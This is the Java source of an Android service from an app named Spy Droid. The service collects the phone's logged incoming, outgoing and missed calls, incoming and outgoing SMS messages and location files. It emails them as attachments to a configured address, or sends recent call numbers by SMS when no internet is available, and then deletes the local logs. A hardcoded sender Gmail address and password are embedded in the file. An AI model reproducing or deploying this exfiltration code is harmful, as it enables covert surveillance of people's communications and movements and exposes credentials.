package com.innolabs.spydroid;

import java.io.File;
import java.util.ArrayList;

import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
//import android.os.Environment;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.gsm.SmsManager;
import android.util.Log;

/**
 * Spy Droid Mail Sender Service is a Service that sends the SPY data to the registrar either by e-mail or SMS.
 * 
 * @author Srikanth Rao
 * 
 * @see android.app.Service
 */
@SuppressWarnings("deprecation")
public class SpyDroidMailSenderService extends Service {

	/** Static variable of type DataBase */
	static DataBase dataBase;

	/** String value for SMS Message */
	String smsMessage;

	/** Shared Preference to retrieve the saved values to send email or sms */
	SharedPreferences sd_sharedprefsMail = null;

	/** String value to store the alert email */
	String toEmail = null;
	
	/** String value to store the sender email */
	String fromEmail = "0xr00t3r@gmail.com";
	
	/** String value to store the alert email password */
	String password = "uc4nn0tcr4ck!t";
	
	/** String valur to store the alert phone number */
	String mobile = null;

	/** String variable to store the Incoming Calls Database table name */
	String incomingCallsTable = "INCOMING_CALLS";
	
	/** String variable to store the Outgoing Calls Database table name */
	String outgoingCallsTable = "OUTGOING_CALLS";

	/** Arraylist of String values to store the Incoming and Outgoing Call Numbers and sent inside the SMS Message */
	ArrayList<String> StringList = new ArrayList<String>();

	/** Array of String values for SPYed log phone numbers */
	String [] phoneNumbers;

	/** String value to show the TAG for the activity in the LOG CAT */
	public static String Email_Tag = "SPY_EMAIL_SENDER";

	/** Method called when BindService is called from other instance
	 * 
	 * @param intent The Intent from which the method was called
	 * 
	 * @return null Noting is sent back to the bindService method
	 * 
	 * @see android.app.Service#onBind(Intent)
	 */
	@Override
	public IBinder onBind(Intent intent) {


		return null;
	}

	/**
	 * Method that is called as soon as the service is started.
	 * 
	 * This method is used to send the spy data either through Email or SMS
	 * 
	 * @see android.app.Service#onStartCommand(Intent, int, int)
	 * 
	 * @return The Intent, Flags and startId which was sent as arguments
	 */
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		// Opening or Creating Database and getting Read Permissions
		dataBase = new DataBase(this, "SPY_DROID");
		dataBase.getReadableDatabase();

		Log.v(Email_Tag, "Opening Database and getting Readable Permission");

		// Getting Shared Preferences data
		sd_sharedprefsMail = this.getSharedPreferences("SD_Prefs", MODE_PRIVATE);

		Log.v(Email_Tag, "Getting Shared Preferences");


		// Sending Email if Internet Connection is available
		if(InternetConnectionAvailable())
		{

			Log.v(Email_Tag, "Internet Connection Available");

			// Getting email and password fields from Shared Preference
			toEmail = sd_sharedprefsMail.getString("sd_email", null);
			
			Log.v(Email_Tag, "Setting email and password values : "+toEmail);

			// Sending Email
			sendEmail();	
		}
		else
		{

			Log.v(Email_Tag, "Internet Connection not Available");

			// Getting mobile number from Shared Preference
			mobile = sd_sharedprefsMail.getString("sd_mobile", null);

			// Setting SMS Message String
			smsMessage = "Incoming Calls : \n"+ getLatestIncomingCalls(incomingCallsTable)+"\n"+ "Outgoing Calls : \n"+ getLatestOutgoingCalls("outGoingCalls");

			// Sending SMS
			sendSMS(mobile, smsMessage);
		}

		// Closing Database
		dataBase.close();

		Log.v(Email_Tag, "Closing Database");

		return super.onStartCommand(intent, flags, startId);
	}



	/**
	 * Send Email Method to send Email with all the SPY data if Internet Connection is available
	 */
	private void sendEmail() {

		// Creating Incoming Calls File
		File incomingCallsFile = new File(Environment.getDataDirectory()+"/data/com.innolabs.spydroid/LOGS", "IncomingCalls.xml");
		
		// Creating Outgoing Calls File
		File outgoingCallsFile = new File(Environment.getDataDirectory()+"/data/com.innolabs.spydroid/LOGS", "OutgoingCalls.xml");
		
		// Creating Missed Calls File
		File missedCallsFile = new File(Environment.getDataDirectory()+"/data/com.innolabs.spydroid/LOGS", "MissedCalls.xml");
		
		// Creating Incoming SMS File
		File incomingSMSFile = new File(Environment.getDataDirectory()+"/data/com.innolabs.spydroid/LOGS", "IncomingSMS.xml");
		
		// Creating Outgoing SMS File
		File outgoingSMSFile = new File(Environment.getDataDirectory()+"/data/com.innolabs.spydroid/LOGS", "OutgoingSMS.xml");
		
		// Creating Locations File
		File locationsFile = new File(Environment.getDataDirectory()+"/data/com.innolabs.spydroid/LOGS", "Locations.xml");

		Log.v(Email_Tag, "incomingCallsFile set to the file to be sent. Address : "+Environment.getDataDirectory()+"/data/com.innolabs.spydroid/LOGS/");

		// Creating Mail object
		Mail mail = new Mail(fromEmail, password);

		try
		{
			String[] toaddress = {toEmail};

			// Setting to Address
			mail.setTo(toaddress);
			
			// Setting From Address
			mail.setFrom(fromEmail);
			
			// Setting Subject for the Email
			mail.setSubject("SPY DROID - Spy Data");

			// Setting Email Body
			mail.setBody("Please check the attachment for the SPY data of your Android phone... "+"\n"+"SPY DROID");

			try {

				// Attaching Incoming Calls File
				mail.addAttachment(incomingCallsFile.getAbsolutePath());

				Log.v(Email_Tag, "Attached : "+incomingCallsFile.getAbsolutePath());

				// Attaching Outgoing Calls File
				mail.addAttachment(outgoingCallsFile.getAbsolutePath());

				Log.v(Email_Tag, "Attached : "+outgoingCallsFile.getAbsolutePath());

				// Attaching Missed Calls File
				mail.addAttachment(missedCallsFile.getAbsolutePath());

				Log.v(Email_Tag, "Attached : "+missedCallsFile.getAbsolutePath());

				// Attaching Incoming SMS File
				mail.addAttachment(incomingSMSFile.getAbsolutePath());

				Log.v(Email_Tag, "Attached : "+incomingSMSFile.getAbsolutePath());

				// Attaching Outgoing SMS File
				mail.addAttachment(outgoingSMSFile.getAbsolutePath());

				Log.v(Email_Tag, "Attached : "+outgoingSMSFile.getAbsolutePath());

				// Attaching Locations File
				mail.addAttachment(locationsFile.getAbsolutePath());

				Log.v(Email_Tag, "Attached : "+locationsFile.getAbsolutePath());
				
				
			} catch (Exception e) {

				// Printing Exceptions
				e.printStackTrace();
			}


			// Checking If Mail is Sent or Not
			if(mail.send())
			{
				Log.v(Email_Tag, "Mail was successfully sent ... ");

			}
			else
			{
				Log.v(Email_Tag, "Mail Sending Failed ... ");
			}


		}

		catch (Exception e)
		{
			// Printing Exceptions
			e.printStackTrace();
		}


		// Deleting all Files
		incomingCallsFile.delete();
		outgoingCallsFile.delete();
		missedCallsFile.delete();
		incomingSMSFile.delete();
		outgoingSMSFile.delete();
		locationsFile.delete();

	}


	/**
	 * Send SMS method to send SMS if Internet Not available
	 * 
	 * @param PhoneNumber Phone Number to which SMS is sent
	 * @param Message Message body that is sent in the SMS
	 */
	private void sendSMS(String PhoneNumber,String Message) {

		// Accessing SMS Manager
		SmsManager smsManager = SmsManager.getDefault();
		PendingIntent smsSentIntent = PendingIntent.getBroadcast(SpyDroidMailSenderService.this, 0, new Intent("SMS_SENT"), 0);

		// Checking if Message length is less than 160 characters
		if(Message.length() < 160)
		{
			// Sending SMS 
			smsManager.sendTextMessage(PhoneNumber, null, Message, smsSentIntent, null);

			Log.v(Email_Tag, "SMS Sent : "+PhoneNumber+" : "+Message);
		}
		
		// Checking if Message length is more than 160 and less than 320 characters
		else if(Message.length() >= 160 && Message.length() < 320)
		{
			// Cutting the SMS into 2 parts
			String smsPart1 = Message.substring(0, 159);
			String smsPart2 = Message.substring(160, Message.length());
			
			// Sending Messages into 2 parts
			smsManager.sendTextMessage(PhoneNumber, null, smsPart1, smsSentIntent, null);
			smsManager.sendTextMessage(PhoneNumber, null, smsPart2, smsSentIntent, null);
		}
		
		// Checking if SMS Message exceeds 320 characters
		else
		{
			// Sending SMS Message
			smsManager.sendTextMessage(PhoneNumber, null, "Calls Log is too big to send", smsSentIntent, null);
		}
	}

	/**
	 * Getting Latest Outgoing Calls Method to get the latest 3 Outgoing Calls
	 * @param outGoingCalls  String variable for Outgoing Calls Table name
	 * @return String value of Message built from String Builder class
	 */
	private String getLatestOutgoingCalls(String outGoingCalls) {

		String[] numbers = null;
		
		// Clearing String List to add new Values
		StringList.clear();

		// Creating Outgoing Calls Cursor from Outgoing Calls database table
		Cursor outgoingnumbersCursor = SpyDroidMailSenderService.dataBase.getValues("OUTGOING_CALLS");

		Log.v(Email_Tag, "Getting the numbersCursor : "+outgoingnumbersCursor);

		// Checking if Outgoing calls Cursor is empty
		if(outgoingnumbersCursor == null){

			Log.v(Email_Tag, "No new Call logs");

			return "No new Call Logs";

		}

		// Checking if Outgoing Calls Cursor count is greater than 0
		if(outgoingnumbersCursor.getCount() > 0)
		{
			// Saving the number count of Outgoing Calls
			numbers = new String[outgoingnumbersCursor.getCount()];

			Log.v(Email_Tag, "Numbers Count : "+outgoingnumbersCursor.getCount());

			// Getting count of Outgoing Calls Cursor
			int count = outgoingnumbersCursor.getCount();

			// Moving Outgoing calls Cursor to last
			outgoingnumbersCursor.moveToLast();

			// Checking if the cursor count is greater than 3
			if(count > 3)
			{

				// Saving the cursor values to String list
				for (int counter = count-1; counter >=outgoingnumbersCursor.getCount()-3; counter--) {

					numbers[counter] = outgoingnumbersCursor.getString(outgoingnumbersCursor.getColumnIndex("phonenum"));
					StringList.add(numbers[counter]);
					
					// Move cursor to previous value
					outgoingnumbersCursor.moveToPrevious();

				}
			}
			else
			{
				// Saving the cursor values (which are less than 3 in number) to a String list
				for (int counter = count-1; counter >= 0; counter--) {


					numbers[counter] = outgoingnumbersCursor.getString(outgoingnumbersCursor.getColumnIndex("phonenum"));
					StringList.add(numbers[counter]);
					
					// Move cursor to previous value
					outgoingnumbersCursor.moveToPrevious();
				}
			}

			Log.v(Email_Tag, "SMS Message :" +StringList);
		}
		
		// Closing Outgoing calls Cursor
		outgoingnumbersCursor.close();

		// Returning the String list value in String form
		return StringList.toString(); 
	}
	
	private String getLatestIncomingCalls(String inComingCalls) {

		String[] numbers = null;
		
		StringList.clear();

		Cursor incomingnumbersCursor = SpyDroidMailSenderService.dataBase.getValues("INCOMING_CALLS");

		Log.v(Email_Tag, "Getting the numbersCursor : "+incomingnumbersCursor);

		if(incomingnumbersCursor == null){

			Log.v(Email_Tag, "No new Call logs");

			return "No new Call Logs";

		}

		if(incomingnumbersCursor.getCount() > 0)
		{
			numbers = new String[incomingnumbersCursor.getCount()];

			Log.v(Email_Tag, "Numbers Count : "+incomingnumbersCursor.getCount());

			int count = incomingnumbersCursor.getCount();

			incomingnumbersCursor.moveToLast();


			if(count > 3)
			{

				for (int counter = count-1; counter >=incomingnumbersCursor.getCount()-3; counter--) {

					numbers[counter] = incomingnumbersCursor.getString(incomingnumbersCursor.getColumnIndex("phonenum"));
					StringList.add(numbers[counter]);
					incomingnumbersCursor.moveToPrevious();

				}
			}
			else
			{
				for (int counter = count-1; counter >= 0; counter--) {


					numbers[counter] = incomingnumbersCursor.getString(incomingnumbersCursor.getColumnIndex("phonenum"));
					StringList.add(numbers[counter]);
					incomingnumbersCursor.moveToPrevious();
				}
			}

			Log.v(Email_Tag, "SMS Message :" +StringList);
		}
		incomingnumbersCursor.close();


		return StringList.toString(); 
	}

	/**
	 * Method to check for Internet Connectivity to send the e-mail
	 * 
	 * @return Boolean value whether Internet connection is available or not
	 */
	private boolean InternetConnectionAvailable() {

		ConnectivityManager checkConnectivity = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
		NetworkInfo connectivity = checkConnectivity.getActiveNetworkInfo();

		if(connectivity == null)
		{

			Log.v(Email_Tag, "No Network Available");

			return false;
		}

		Log.v(Email_Tag, "Internet Connection is Avaliable");

		return connectivity.isConnectedOrConnecting();
	}

}
